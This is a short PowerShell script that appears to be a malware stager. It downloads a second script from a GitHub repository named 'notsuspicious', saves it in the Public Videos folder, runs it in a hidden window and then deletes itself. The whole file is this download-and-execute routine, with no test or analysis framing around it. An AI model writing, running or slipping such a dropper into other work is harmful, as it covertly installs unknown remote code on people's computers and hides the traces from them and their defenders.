# Define the URL of the script to download
$url = "https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1"

# Define the path to save the downloaded script
$scriptPath = "C:\Users\Public\Videos\downloader.ps1"

# Download the script content
Invoke-WebRequest -Uri $url -OutFile $scriptPath -UseBasicParsing

# Execute the script silently
Start-Process powershell.exe -ArgumentList "-File $scriptPath" -WindowStyle Hidden

# Remove the current script file
Remove-Item $PSCommandPath -Force
